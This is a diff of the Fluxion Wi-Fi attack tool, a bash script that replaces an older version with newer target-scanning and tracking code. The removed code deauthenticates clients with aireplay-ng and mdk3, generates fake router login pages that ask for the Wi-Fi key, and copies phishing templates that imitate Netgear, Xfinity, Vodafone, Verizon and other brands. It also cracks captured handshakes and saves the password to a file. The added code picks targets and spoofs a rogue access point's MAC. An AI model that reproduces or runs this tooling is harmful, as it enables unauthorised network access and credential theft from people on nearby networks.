-                echo \"2\">$DUMP_PATH/intento
-                break
-                else
-                echo \"1\">$DUMP_PATH/intento
-                fi
-
-                fi
-                ">>$DUMP_PATH/handcheck
-        fi
-
-        echo "readarray -t CLIENTESDHCP < <(nmap -PR -sn -n -oG - $RANG_IP.100-110 2>&1 | grep Host )
-
-        echo
-        echo -e \"  ACCESS POINT:\"
-        echo -e \"    SSID............: "$white"$Host_SSID"$transparent"\"
-        echo -e \"    MAC.............: "$yellow"$Host_MAC"$transparent"\"
-        echo -e \"    Channel.........: "$white"$Host_CHAN"$transparent"\"
-        echo -e \"    Vendor..........: "$green"$Host_MAC_MODEL"$transparent"\"
-        echo -e \"    Operation time..: "$blue"\$ih\$horas:\$im\$minutos:\$is\$segundos"$transparent"\"
-        echo -e \"    Attempts........: "$red"\$(cat $DUMP_PATH/hit.txt)"$transparent"\"
-        echo -e \"    Clients.........: "$blue"\$(cat $DUMP_PATH/clientes.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)"$transparent"\"
-        echo
-        echo -e \"  CLIENTS ONLINE:\"
-
-        x=0
-        for cliente in \"\${CLIENTESDHCP[@]}\"; do
-          x=\$((\$x+1))
-          CLIENTE_IP=\$(echo \$cliente| cut -d \" \" -f2)
-          CLIENTE_MAC=\$(nmap -PR -sn -n \$CLIENTE_IP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])
-
-          if [ \"\$(echo \$CLIENTE_MAC| wc -m)\" != \"18\" ]; then
-                CLIENTE_MAC=\"xx:xx:xx:xx:xx:xx\"
-          fi
-
-          CLIENTE_FABRICANTE=\$(macchanger -l | grep \"\$(echo \"\$CLIENTE_MAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)
-
-          if echo \$CLIENTE_MAC| grep -q x; then
-                    CLIENTE_FABRICANTE=\"unknown\"
-          fi
-
-          CLIENTE_HOSTNAME=\$(grep \$CLIENTE_IP $DUMP_PATH/clientes.txt | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')
-
-          echo -e \"    $green \$x) $red\$CLIENTE_IP $yellow\$CLIENTE_MAC $transparent($blue\$CLIENTE_FABRICANTE$transparent) $green \$CLIENTE_HOSTNAME$transparent\"
-        done
-
-        echo -ne \"\033[K\033[u\"">>$DUMP_PATH/handcheck
-
-
-        if [ $authmode = "handshake" ]; then
-                echo "let i=\$(date +%s)-\$timestamp
-                sleep 1">>$DUMP_PATH/handcheck
-
-        elif [ $authmode = "wpa_supplicant" ]; then
-                echo "sleep 5
-
-                killall wpa_supplicant &>$flux_output_device
-                killall wpa_passphrase &>$flux_output_device
-                let i=\$i+5">>$DUMP_PATH/handcheck
-        fi
-
-        echo "done
-        clear
-        echo \"1\" > $DUMP_PATH/status.txt
-
-        sleep 7
-
-        killall mdk3 &>$flux_output_device
-        killall aireplay-ng &>$flux_output_device
-        killall airbase-ng &>$flux_output_device
-        kill \$(ps a | grep python| grep fakedns | awk '{print \$1}') &>$flux_output_device
-        killall hostapd &>$flux_output_device
-        killall lighttpd &>$flux_output_device
-        killall dhcpd &>$flux_output_device
-        killall wpa_supplicant &>$flux_output_device
-        killall wpa_passphrase &>$flux_output_device
-
-        echo \"
-        FLUX $version by ghost
-
-        SSID: $Host_SSID
-        BSSID: $Host_MAC ($Host_MAC_MODEL)
-        Channel: $Host_CHAN
-        Security: $Host_ENC
-        Time: \$ih\$horas:\$im\$minutos:\$is\$segundos
-        Password: \$(cat $DUMP_PATH/data.txt)
-        \" >\"$HOME/$Host_SSID-password.txt\"">>$DUMP_PATH/handcheck
-
-
-        if [ $authmode = "handshake" ]; then
-                echo "aircrack-ng -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $DUMP_PATH/data.txt && echo && echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"
-                ">>$DUMP_PATH/handcheck
-
-        elif [ $authmode = "wpa_supplicant" ]; then
-                echo "echo -e \"The password was saved in "$red"$HOME/$Host_SSID-password.txt"$transparent"\"">>$DUMP_PATH/handcheck
-        fi
-
-        echo "kill -INT \$(ps a | grep bash| grep flux | awk '{print \$1}') &>$flux_output_device">>$DUMP_PATH/handcheck
-        chmod +x $DUMP_PATH/handcheck
+      case "${IOQueryFormatFields[1]}" in
+        "$FLUXIONGeneralSkipOption")
+          FluxionInterfaceSelected=""
+          FluxionInterfaceSelectedState=""
+          FluxionInterfaceSelectedInfo=""
+          return 0;;
+        "$FLUXIONGeneralRepeatOption") continue;;
+        "$FLUXIONGeneralBackOption") return -1;;
+        *)
+          FluxionInterfaceSelected="${IOQueryFormatFields[1]}"
+          FluxionInterfaceSelectedState="${IOQueryFormatFields[2]}"
+          FluxionInterfaceSelectedInfo="${IOQueryFormatFields[3]}"
+          break;;
+      esac
+    fi
+  done
 }
 
 
-############################################# < ATTACK > ############################################
+# ============== < Fluxion Target Subroutines > ============== #
+# Parameters: interface [ channel(s) [ band(s) ] ]
+# ------------------------------------------------------------ #
+# Return 1: Missing monitor interface.
+# Return 2: Xterm failed to start airmon-ng.
+# Return 3: Invalid capture file was generated.
+# Return 4: No candidates were detected.
+fluxion_target_get_candidates() {
+  # Assure a valid wireless interface for scanning was given.
+  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi
 
+  echo -e "$FLUXIONVLine $FLUXIONStartingScannerNotice"
+  echo -e "$FLUXIONVLine $FLUXIONStartingScannerTip"
 
+  # Assure all previous scan results have been cleared.
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
 
+  #if [ "$FLUXIONAuto" ]; then
+  #  sleep 30 && killall xterm &
+  #fi
 
+  # Begin scanner and output all results to "dump-01.csv."
+if ! xterm -title "$FLUXIONScannerHeader" $TOPLEFTBIG \
+    -bg "#000000" -fg "#FFFFFF" -e \
+    "airodump-ng -Mat WPA "${2:+"--channel $2"}" "${3:+"--band $3"}" -w \"$FLUXIONWorkspacePath/dump\" $1" 2> $FLUXIONOutputDevice; then
+    echo -e "$FLUXIONVLine$CRed $FLUXIONGeneralXTermFailureError"
+    sleep 5
+    return 2
+fi
 
+  # Sanity check the capture files generated by the scanner.
+  # If the file doesn't exist, or if it's empty, abort immediately.
+  if [ ! -f "$FLUXIONWorkspacePath/dump-01.csv" -o \
+    ! -s "$FLUXIONWorkspacePath/dump-01.csv" ]; then
+    sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
+    return 3
+  fi
 
-############################################## < STUFF > ############################################
+  # Syntheize scan opeFLUXIONWindowRation results from output file "dump-01.csv."
+  echo -e "$FLUXIONVLine $FLUXIONPreparingScannerResultsNotice"
+  # WARNING: The code below may break with different version of airmon-ng.
+  # The times matching operator "{n}" isn't supported by mawk (alias awk).
+  # readarray FLUXIONTargetCandidates < <(
+  #   gawk -F, 'NF==15 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
+  #   $FLUXIONWorkspacePath/dump-01.csv
+  # )
+  # readarray FLUXIONTargetCandidatesClients < <(
+  #   gawk -F, 'NF==7 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
+  #   $FLUXIONWorkspacePath/dump-01.csv
+  # )
+  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
+  readarray FluxionTargetCandidates < <(
+    awk -F, "NF==15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
+    "$FLUXIONWorkspacePath/dump-01.csv"
+  )
+  readarray FluxionTargetCandidatesClients < <(
+    awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
+    "$FLUXIONWorkspacePath/dump-01.csv"
+  )
 
-# Deauth all
-function deauthall {
+  # Cleanup the workspace to prevent potential bugs/conflicts.
+  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
 
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $Host_SSID" -e aireplay-ng --deauth $DEAUTHTIME -a $Host_MAC --ignore-negative-one $WIFI_MONITOR &
+  if [ ${#FluxionTargetCandidates[@]} -eq 0 ]; then
+    echo -e "$FLUXIONVLine $FLUXIONScannerDetectedNothingNotice"
+    sleep 3
+    return 4
+  fi
 }
 
-function deauthmdk3 {
 
-        echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating via mdk3 all clients on $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-        mdk3PID=$!
+fluxion_get_target() {
+  # Assure a valid wireless interface for scanning was given.
+  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi
+
+  local -r interface=$1
+
+  local choices=( \
+    "$FLUXIONScannerChannelOptionAll (2.4GHz)" \
+    "$FLUXIONScannerChannelOptionAll (5GHz)" \
+    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)" \
+    "$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption"
+  )
+
+  io_query_choice "$FLUXIONScannerChannelQuery" choices[@]
+
+  echo
+
+  case "$IOQueryChoice" in
+    "$FLUXIONScannerChannelOptionAll (2.4GHz)")
+      fluxion_target_get_candidates $interface "" "bg";;
+
+    "$FLUXIONScannerChannelOptionAll (5GHz)")
+      fluxion_target_get_candidates $interface "" "a";;
+
+    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
+      fluxion_target_get_candidates $interface "" "abg";;
+
+    "$FLUXIONScannerChannelOptionSpecific")
+      fluxion_header
+
+      echo -e "$FLUXIONVLine $FLUXIONScannerChannelQuery"
+      echo
+      echo -e "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
+      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
+      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
+      echo
+      echo -ne "$FLUXIONPrompt"
+
+      local channels
+      read channels
+
+      echo
+
+      fluxion_target_get_candidates $interface $channels;;
+
+    "$FLUXIONGeneralBackOption")
+      return -1;;
+  esac
+
+  # Abort if errors occured while searching for candidates.
+  if [ $? -ne 0 ]; then return 2; fi
+
+  local candidatesMAC=()
+  local candidatesClientsCount=()
+  local candidatesChannel=()
+  local candidatesSecurity=()
+  local candidatesSignal=()
+  local candidatesPower=()
+  local candidatesESSID=()
+  local candidatesColor=()
+
+  # Gather information from all the candidates detected.
+  # TODO: Clean up this for loop using a cleaner algorithm.
+  # Maybe try using array appending & [-1] for last elements.
+  for candidateAPInfo in "${FluxionTargetCandidates[@]}"; do
+    # Strip candidate info from any extraneous spaces after commas.
+    candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")
+
+    local i=${#candidatesMAC[@]}
+
+    candidatesMAC[i]=$(echo "$candidateAPInfo" | cut -d , -f 1)
+    candidatesClientsCount[i]=$(
+      echo "${FluxionTargetCandidatesClients[@]}" |
+      grep -c "${candidatesMAC[i]}"
+    )
+    candidatesChannel[i]=$(echo "$candidateAPInfo" | cut -d , -f 4)
+    candidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
+    candidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
+    candidatesColor[i]=$(
+      [ ${candidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr
+    )
+
+    # Parse any non-ascii characters by letting bash handle them.
+    # Escape all single quotes in ESSID and let bash's $'...' handle it.
+    local sanitizedESSID=$(
+      echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
+    )
+    candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")
+
+    local power=${candidatesPower[i]}
+    if [ $power -eq -1 ]; then
+      # airodump-ng's man page says -1 means unsupported value.
+      candidatesQuality[i]="??"
+    elif [ $power -le $FLUXIONNoiseFloor ]; then
+      candidatesQuality[i]=0
+    elif [ $power -gt $FLUXIONNoiseCeiling ]; then
+      candidatesQuality[i]=100
+    else
+      # Bash doesn't support floating point division, work around it...
+      # Q = ((P - F) / (C - F)); Q-quality, P-power, F-floor, C-Ceiling.
+      candidatesQuality[i]=$(( \
+        (${candidatesPower[i]} * 10 - $FLUXIONNoiseFloor * 10) / \
+        (($FLUXIONNoiseCeiling - $FLUXIONNoiseFloor) / 10) \
+      ))
+    fi
+  done
+
+  format_center_literals "WIFI LIST"
+  local -r headerTitle="$FormatCenterLiterals\n\n"
+
+  format_apply_autosize "$CRed[$CSYel ** $CClr$CRed]$CClr %-*.*s %4s %3s %3s %2s %-8.8s %18s\n"
+  local -r headerFields=$(
+    printf "$FormatApplyAutosize" \
+      "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID"
+  )
+
+  format_apply_autosize "$CRed[$CSYel%03d$CClr$CRed]%b %-*.*s %3s%% %3s %3d %2s %-8.8s %18s\n"
+  io_query_format_fields "$headerTitle$headerFields" \
+   "$FormatApplyAutosize" \
+    candidatesColor[@] \
+    candidatesESSID[@] \
+    candidatesQuality[@] \
+    candidatesPower[@] \
+    candidatesClientsCount[@] \
+    candidatesChannel[@] \
+    candidatesSecurity[@] \
+    candidatesMAC[@]
+
+  echo
+
+  FluxionTargetMAC=${IOQueryFormatFields[7]}
+  FluxionTargetSSID=${IOQueryFormatFields[1]}
+  FluxionTargetChannel=${IOQueryFormatFields[5]}
+
+  FluxionTargetEncryption=${IOQueryFormatFields[6]}
+
+  FluxionTargetMakerID=${FluxionTargetMAC:0:8}
+  FluxionTargetMaker=$(
+    macchanger -l |
+    grep ${FluxionTargetMakerID,,} 2> $FLUXIONOutputDevice |
+    cut -d ' ' -f 5-
+  )
+
+  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)
+
+  # We'll change a single hex digit from the target AP's MAC address.
+  # This new MAC address will be used as the rogue AP's MAC address.
+  local -r rogueMACHex=$(printf %02X $((0x${FluxionTargetMAC:13:1} + 1)))
+  FluxionTargetRogueMAC="${FluxionTargetMAC::13}${rogueMACHex:1:1}${FluxionTargetMAC:14:4}"
 }
 
-# Deauth to a specific target
-function deauthesp {
-
-        sleep 2
-        xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating client $Client_MAC" -e aireplay-ng -0 $DEAUTHTIME -a $Host_MAC -c $Client_MAC --ignore-negative-one $WIFI_MONITOR &
+fluxion_target_normalize_SSID() {
+  # Sanitize network ESSID to make it safe for manipulation.
+  # Notice: Why remove these? Some smartass might decide to name their
+  # network "; rm -rf / ;". If the string isn't sanitized accidentally
+  # shit'll hit the fan and we'll have an extremly distressed user.
+  # Replacing ' ', '/', '.', '~', '\' with '_'
+  echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'
 }
 
-# Close all processes
-function matartodo {
+fluxion_target_show() {
+  format_apply_autosize "%*s$CBlu%7s$CClr: %-32s%*s\n"
 
-        killall aireplay-ng &>$flux_output_device
-        kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
-        killall hostapd &>$flux_output_device
-        killall lighttpd &>$flux_output_device
-        killall dhcpd &>$flux_output_device
-        killall xterm &>$flux_output_device
+  local colorlessFormat="$FormatApplyAutosize"
+  local colorfullFormat=$(
+    echo "$colorlessFormat" | sed -r 's/%-32s/%-32b/g'
+  )
 
+  printf "$colorlessFormat" "" "ESSID" "\"${FluxionTargetSSID:-[N/A]}\" / ${FluxionTargetEncryption:-[N/A]}" ""
+  printf "$colorlessFormat" "" "Channel" " ${FluxionTargetChannel:-[N/A]}" ""
+  printf "$colorfullFormat" "" "BSSID" " ${FluxionTargetMAC:-[N/A]} ($CYel${FluxionTargetMaker:-[N/A]}$CClr)" ""
+
+  echo
 }
 
-######################################### < INTERFACE WEB > ########################################
+fluxion_target_tracker_daemon() {
+  if [ ! "$1" ]; then return 1; fi # Assure we've got fluxion's PID.
 
-# Create the contents for the web interface
-function NEUTRA {
+  readonly fluxionPID=$1
+  readonly monitorTimeout=10 # In seconds.
+  readonly capturePath="$FLUXIONWorkspacePath/tracker_capture"
 
-        if [ ! -d $DUMP_PATH/data ]; then
-                mkdir $DUMP_PATH/data
-        fi
+  if [ \
+    -z "$FluxionTargetMAC" -o \
+    -z "$FluxionTargetSSID" -o \
+    -z "$FluxionTargetChannel" ]; then
+    return 2 # If we're missing target information, we can't track properly.
+  fi
 
-        source $WORK_DIR/lib/site/index | base64 -d > $DUMP_PATH/file.zip
+  while true; do
+    echo "[T-Tracker] Captor listening for $monitorTimeout seconds..."
+    timeout --preserve-status $monitorTimeout airodump-ng -aw "$capturePath" \
+      -d "$FluxionTargetMAC" $FluxionTargetTrackerInterface &> /dev/null
+    local error=$? # Catch the returned status error code.
 
-        unzip $DUMP_PATH/file.zip -d $DUMP_PATH/data &>$flux_output_device
-        rm $DUMP_PATH/file.zip &>$flux_output_device
+    if [ $error -ne 0 ]; then # If any error was encountered, abort!
+      echo -e "[T-Tracker] ${CRed}Error:$CClr Operation aborted (code: $error)!"
+      break
+    fi
 
-        echo "<!DOCTYPE html>
-        <html>
-        <head>
-            <title>Login Page</title>
-            <meta charset=\"UTF-8\">
-            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-                <!-- Styles -->
-            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
-                <!-- Scripts -->
-                <script src=\"js/jquery-1.11.1.min.js\"></script>
-                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-        </head>
-        <body>
-                <!-- final page -->
-            <div id=\"done\" data-role=\"page\" data-theme=\"a\">
-                        <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-                                <h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
-                        </div>
-            </div>
-        </body>
-</html>" > $DUMP_PATH/data/final.html
+    local targetInfo=$(head -n 3 "$capturePath-01.csv" | tail -n 1)
+    sandbox_remove_workfile "$capturePath-*"
 
-        echo "<!DOCTYPE html>
-        <html>
-        <head>
-            <title>Login Page</title>
-            <meta charset=\"UTF-8\">
-            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-                <!-- Styles -->
-            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
-                <!-- Scripts -->
-                <script src=\"js/jquery-1.11.1.min.js\"></script>
-                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-                <script src=\"js/jquery.validate.min.js\"></script>
-                <script src=\"js/additional-methods.min.js\"></script>
-        </head>
-        <body>
-                <!-- Error page -->
-            <div data-role=\"page\" data-theme=\"a\">
-                        <div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
-                                <h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
-                                <a href=\"index.htm\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.htm'\">$DIALOG_WEB_BACK</a>
-                        </div>
-            </div>
-        </body>
-</html>" > $DUMP_PATH/data/error.html
+    local targetChannel=$(
+      echo "$targetInfo" | awk -F, '{gsub(/ /, "", $4); print $4}'
+    )
 
-        echo "<!DOCTYPE html>
-        <html>
-        <head>
-            <title>Login Page</title>
-            <meta charset=\"UTF-8\">
-            <meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">
-                <!-- Styles -->
-            <link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
-                <link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>
-                <!-- Scripts -->
-                <script src=\"js/jquery-1.11.1.min.js\"></script>
-                <script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
-                <script src=\"js/jquery.validate.min.js\"></script>
-                <script src=\"js/additional-methods.min.js\"></script>
-        </head>
-        <body>
-                <!-- Main page -->
-            <div data-role=\"page\" data-theme=\"a\">
-                        <div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
-                                <fieldset>
-                                        <form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
-                                                </br>
-                                                <div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
-                                                        <div>ESSID: <u>$Host_SSID</u></div>
-                                                        <div>BSSID: <u>$Host_MAC</u></div>
-                                                        <div>Channel: <u>$Host_CHAN</u></div>
-                                                </div>
-                                                <div style=\"text-align:center;\">
-                                                        <br><label>$DIALOG_WEB_INFO</label></br>
-                                                </div>
-                                                <div class=\"ui-field-contain\" >
-                                                        <label for=\"key1\">$DIALOG_WEB_INPUT</label>
-                                                        <input id=\"key1\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
-                                                </div>
+    echo "[T-Tracker] $targetInfo"
 
-                                                <input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
-                                        </form>
-                                </fieldset>
-                        </div>
-            </div>
-                <script src=\"js/main.js\"></script>
-                <script>
-    $.extend( $.validator.messages, {
-        required: \"$DIALOG_WEB_ERROR_MSG\",
-        maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
-        minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )});
-  </script>
-        </body>
-</html>" > $DUMP_PATH/data/index.htm
+    if [ "$targetChannel" -ne "$FluxionTargetChannel" ]; then
+      echo "[T-Tracker] Target channel change detected!"
+      FluxionTargetChannel=$targetChannel
+      break
+    fi
+
+    # NOTE: We might also want to check for SSID changes here, assuming the only
+    # thing that remains constant is the MAC address. The problem with that is
+    # that airodump-ng has some serious problems with unicode, apparently.
+    # Try feeding it an access point with Chinese characters and check the .csv.
+  done
+
+  # Save/overwrite the new target information to the workspace for retrival.
+  echo "$FluxionTargetMAC" > "$FLUXIONWorkspacePath/target_info.txt"
+  echo "$FluxionTargetSSID" >> "$FLUXIONWorkspacePath/target_info.txt"
+  echo "$FluxionTargetChannel" >> "$FLUXIONWorkspacePath/target_info.txt"
+
+  # NOTICE: Using different signals for different things is a BAD idea.
+  # We should use a single signal, SIGINT, to handle different situations.
+  kill -s SIGALRM $fluxionPID # Signal fluxion a change was detected.
+
+  sandbox_remove_workfile "$capturePath-*"
 }
 
-# Functions to populate the content for the custom phishing pages
-function ARRIS {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/ARRIS-ENG/* $DUMP_PATH/data
-
+fluxion_target_tracker_stop() {
+  if [ ! "$FluxionTargetTrackerDaemonPID" ]; then return 1; fi
+  kill -s SIGABRT $FluxionTargetTrackerDaemonPID &> /dev/null
+  FluxionTargetTrackerDaemonPID=""
 }
 
-function BELKIN {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/belkin_eng/* $DUMP_PATH/data
+fluxion_target_tracker_start() {
+  if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi
 
+  fluxion_target_tracker_daemon $$ &> "$FLUXIONOutputDevice" &
+  FluxionTargetTrackerDaemonPID=$!
 }
 
-function NETGEAR {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/netgear_eng/* $DUMP_PATH/data
+fluxion_target_unset_tracker() {
+  if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi
 
+  FluxionTargetTrackerInterface=""
 }
 
-function ARRIS2 {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/arris_esp/* $DUMP_PATH/data
+fluxion_target_set_tracker() {
+  if [ "$FluxionTargetTrackerInterface" ]; then
+    echo "Tracker interface already set, skipping." > $FLUXIONOutputDevice
+    return 0
+  fi
 
-}
-function NETGEAR2 {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/netgear_esp/* $DUMP_PATH/data
+  # Check if attack provides tracking interfaces, get & set one.
+  if ! type -t attack_tracking_interfaces &> /dev/null; then
+    echo "Tracker DOES NOT have interfaces available!" > $FLUXIONOutputDevice
+    return 1
+  fi
 
-}
+  if [ "$FluxionTargetTrackerInterface" == "" ]; then
+    echo "Running get interface (tracker)." > $FLUXIONOutputDevice
+    local -r interfaceQuery=$FLUXIONTargetTrackerInterfaceQuery
+    local -r interfaceQueryTip=$FLUXIONTargetTrackerInterfaceQueryTip
+    local -r interfaceQueryTip2=$FLUXIONTargetTrackerInterfaceQueryTip2
+    if ! fluxion_get_interface attack_tracking_interfaces \
+      "$interfaceQuery\n$FLUXIONVLine $interfaceQueryTip\n$FLUXIONVLine $interfaceQueryTip2"; then
+      echo "Failed to get tracker interface!" > $FLUXIONOutputDevice
+      return 2
+    fi
+    local selectedInterface=$FluxionInterfaceSelected
+  else
+    # Assume user passed one via the command line and move on.
+    # If none was given we'll take care of that case below.
+    local selectedInterface=$FluxionTargetTrackerInterface
+    echo "Tracker interface passed via command line!" > $FLUXIONOutputDevice
+  fi
 
-function TPLINK {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-    cp -r  $WORK_DIR/sites/tplink/* $DUMP_PATH/data
-}
+  # If user skipped a tracker interface, move on.
+  if [ ! "$selectedInterface" ]; then
+    fluxion_target_unset_tracker
+    return 0
+  fi
 
-function VODAFONE {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/vodafone_esp/* $DUMP_PATH/data
-}
+  if ! fluxion_allocate_interface $selectedInterface; then
+    echo "Failed to allocate tracking interface!" > $FLUXIONOutputDevice
+    return 3
+  fi
 
-function VERIZON {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/verizon/Verizon_files $DUMP_PATH/data
-        cp $WORK_DIR/sites/verizon/Verizon.html $DUMP_PATH/data
-}
-
-function HUAWEI {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/huawei_eng/* $DUMP_PATH/data
-
-        }
-
-function ZIGGO_NL {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/ziggo_nl/* $DUMP_PATH/data
-        }
-
-function KPN_NL {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/kpn_nl/* $DUMP_PATH/data
-        }
-
-function ZIGGO2016_NL {
-    mkdir $DUMP_PATH/data &>$flux_output_device
-    cp -r  $WORK_DIR/sites/ziggo2_nl/* $DUMP_PATH/data
+  echo "Successfully got tracker interface." > $FLUXIONOutputDevice
+  FluxionTargetTrackerInterface=${FluxionInterfaces[$selectedInterface]}
 }
 
-function FRITZBOX_DE {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/fritzbox_de/* $DUMP_PATH/data
-        }
+fluxion_target_unset() {
+  FluxionTargetMAC=""
+  FluxionTargetSSID=""
+  FluxionTargetChannel=""
 
-function FRITZBOX_ENG {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/fritzbox_eng/* $DUMP_PATH/data
-        }
+  FluxionTargetEncryption=""
 
-function GENEXIS_DE {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r  $WORK_DIR/sites/genenix_de/* $DUMP_PATH/data
-        }
+  FluxionTargetMakerID=""
+  FluxionTargetMaker=""
 
-function Login-Netgear {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/Login-Netgear/* $DUMP_PATH/data
-        }
+  FluxionTargetSSIDClean=""
 
-function Login-Xfinity {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/Login-Xfinity/* $DUMP_PATH/data
-        }
+  FluxionTargetRogueMAC=""
 
-function Telekom {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/telekom/* $DUMP_PATH/data
-        }
+  return 1 # To trigger undo-chain.
+}
 
-function google {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/google_de/* $DUMP_PATH/data
-        }
+fluxion_target_set() {
+  # Check if attack is targetted & set the attack target if so.
+  if ! type -t attack_targetting_interfaces &> /dev/null; then
+    return 1
+  fi
 
-function MOVISTAR_ES {
-        mkdir $DUMP_PATH/data &>$flux_output_device
-        cp -r $WORK_DIR/sites/movistar_esp/* $DUMP_PATH/data
-  }
+  if [ \
+    "$FluxionTargetSSID" -a \
+    "$FluxionTargetMAC" -a \
+    "$FluxionTargetChannel" \
+  ]; then
+    # If we've got a candidate target, ask user if we'll keep targetting it.
+
+    fluxion_header
+    fluxion_target_show
+    echo
+    echo -e  "$FLUXIONVLine $FLUXIONTargettingAccessPointAboveNotice"
+
+    # TODO: This doesn't translate choices to the selected language.
+    while ! echo "$choice" | grep -q "^[ynYN]$" &> /dev/null; do
+      echo -ne "$FLUXIONVLine $FLUXIONContinueWithTargetQuery [Y/n] "
+      local choice
+      read choice
+      if [ ! "$choice" ]; then break; fi
+    done
+
+    echo -ne "\n\n"
+
+    if [ "${choice,,}" != "n" ]; then
+      return 0
+    fi
+  elif [ \
+    "$FluxionTargetSSID" -o \
+    "$FluxionTargetMAC" -o \
+    "$FluxionTargetChannel" \
+  ]; then
+    # TODO: Survey environment here to autofill missing fields.
+    # In other words, if a user gives incomplete information, scan
